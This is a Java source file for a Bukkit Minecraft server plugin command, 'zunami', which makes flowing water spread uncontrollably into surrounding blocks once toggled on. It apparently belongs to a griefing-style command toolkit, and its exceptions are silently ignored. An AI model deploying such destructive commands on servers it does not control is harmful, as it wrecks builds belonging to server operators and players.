package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockFromToEvent;

public class Command_Zunami extends CommandBase implements Listener {

    private boolean enabled = false;

    public Command_Zunami() {
        super("zunami", "-", Category.WORLD);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        try {
            if (!this.enabled) {
                this.enabled = true;
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_Zunami2(this, p));
            } else {
                this.enabled = false;
                p.sendMessage(Start.INSTANCE.chatPrefix + "Die Zunami wurde gestoppt!");
            }
        } catch (Exception ignored) {
        }
    }

    @EventHandler
    public void onBlockFromTo(BlockFromToEvent e) {
        if (this.enabled) {
            try {
                if (e.getBlock().getType().getId() == 8 || e.getBlock().getType().getId() == 9 && e.getBlock().getData() == 8) {
                    for (double x = e.getBlock().getLocation().getX() - 1.0D; x <= e.getBlock().getLocation().getX() + 1.0D; ++x) {
                        for (double z = e.getBlock().getLocation().getZ() - 1.0D; z <= e.getBlock().getLocation().getZ() + 1.0D; ++z) {
                            (new Location(e.getBlock().getWorld(), x, e.getBlock().getLocation().getY(), z)).getBlock().setType(Material.WATER);
                            (new Location(e.getBlock().getWorld(), x, e.getBlock().getLocation().getY(), z)).getBlock().setData((byte) 8);
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }
    }

}
